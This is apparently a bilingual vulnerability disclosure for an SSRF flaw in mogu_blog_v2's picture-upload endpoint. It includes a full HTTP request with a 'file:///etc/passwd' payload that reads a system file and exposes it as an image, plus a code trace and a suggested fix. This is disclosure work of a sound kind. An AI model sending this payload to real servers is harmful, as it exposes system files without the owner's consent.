# mogu_blog_v2-FileRestApi#uploadPicsByUrl has a SSRF vulnerability
## 1、复现详情（Reproduction details）

**构造BurpSuite请求报文，利用file协议读取文件/etc/passwd中的内容，写入到图片中：**
**Construct a BurpSuite request message, use the file protocol to read the contents of the /etc/passwd file, and write it into an image:**
```
POST /mogu-picture/file/uploadPicsByUrl HTTP/1.1
Host: you-ip:8602
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: bearer_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pblVpZCI6IjFmMDFjZDFkMmY0NzQ3NDNiMjQxZDc0MDA4YjEyMzMzIiwicm9sZSI6Im51bGzotoXnuqfnrqHnkIYiLCJjcmVhdGVUaW1lIjoxNjgwMTU2NjY4NTExLCJzdWIiOiJhZG1pbiIsImlzcyI6Im1vZ3VibG9nIiwiYXVkIjoiMDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjYiLCJleHAiOjE2ODAxNjAyNjgsIm5iZiI6MTY4MDE1NjY2OH0.oXuQcn6Do52V7XkiPiH1Ug1XKOHNgKk4BTeksFgj8DI
Connection: close
Content-Type: application/json
Content-Length: 122

{
	"token":"asdf",
        "adminUid":"asdf",
        "sortName":"admin",
        "projectName":"blog",
        "urlList":[
                "file:///etc/passwd"]
}
```
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228767407-97dbd606-f5df-4d9b-944e-c4b0385eb4cf.png">
访问图片地址：http://you-ip:8600/blog/admin/jpg/2023/3/30/1680160261977.jpg

Visit image address: http://your-ip:8600/blog/admin/jpg/2023/3/30/1680160261977.jpg
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228767603-d1f5cacc-e6de-425a-9700-446f532751e1.png">

## 2、底层分析（Bottom-up analysis）
**入口点：**
**Entrance point：**
FileRestApi#uploadPicsByUrl
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228768196-8be3c066-0dd7-48c5-829f-79b9afa4000c.png">

进入`uploadPictureByUrl()`方法：
传入的`fileV0`为springboot前端传入的参数自动装配，从`fileV0`中取出`urlList`
Enter the `uploadPictureByUrl()` method：
The incoming `fileV0` is the parameter automatically wired by the Spring Boot frontend. Extract `urlList` from `fileV0`
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228768425-13cb827c-4e5b-44d9-8ae8-2f7ac33ef3af.png">

遍历`urlList`并传入`uploadPictureByUrl()`方法中，中间未作任何过滤：
Traverse `urlList` and pass it into the `uploadPictureByUrl()` method without any filtering in between:
<img width="416" alt="image" src="https://user-images.githubusercontent.com/129370953/228768467-d3c43f0b-62c4-4bc4-ad98-d47868fcbc78.png">

更进`uploadPictureByUrl`方法：
`uploadPictureByUrl`方法中也未作任何过滤，直接传入URL类中
Further improve the `uploadPictureByUrl` method: 
no filtering is done in the `uploadPictureByUrl` method, and the URL is directly passed in
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228768495-8dac6c21-16dd-4766-b5fa-2ff5761ba1bc.png">

调用`openConnection`方法后，获取数据流写入输出流中：
After calling the `openConnection` method, get the data stream and write it to the output stream：
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228768549-5d31473b-c14b-4fb5-a618-f801a32095a9.png">

文件写入的路径（文件输出流）：
The path for writing the file (output stream):
<img width="415" alt="image" src="https://user-images.githubusercontent.com/129370953/228768583-ac788056-57cd-4fc2-b374-300cd886e3f2.png">


## 3、修复方案（Repair plan）
（1）建议使用`HttpURLConnection`类，替代`Url`类，并对请求的ip地址进行判断，过滤掉内网ip
（1）Suggest using the `HttpURLConnection` class instead of the `Url` class, and filtering out intranet IP addresses by checking the requested IP address
